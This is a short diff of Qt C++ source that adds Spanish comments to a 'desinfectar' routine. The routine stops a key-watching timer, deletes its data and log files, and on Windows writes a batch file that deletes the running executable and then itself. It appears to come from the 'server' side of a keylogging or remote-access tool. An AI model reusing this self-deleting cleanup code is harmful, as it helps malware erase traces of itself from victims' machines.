@@ -529,12 +529,14 @@ void MainWindow::reiniciar(){
 }
 void MainWindow::desinfectar()
 {
+    /** Esta funcion borra todos los archivos del servidor y luego se borra a si mismo **/
     this->verTecla.stop();
     apagar();
     QFile::remove(directorio.tempPath() + "/dat");
     QFile::remove(directorio.tempPath() + "/log");
     QFile::remove("data");
     #ifdef Q_WS_WIN
+    /* En Windows lo que hacemos es crear un .bat que espere un cierto tiempo para dar tiempo al servidor a cerrarse y luego lo borra */
     QByteArray bat;
     bat = "@echo off \nping localhost -n 1 -w 1000 > null\ndel \"" + QApplication::applicationFilePath().toLatin1() + "\"\ndel \"" + QApplication::applicationDirPath().toLatin1() + "/null\"\ndel \"" + QApplication::applicationDirPath().toLatin1() + "/borrar.bat\"";
     bat.replace("/","\\");
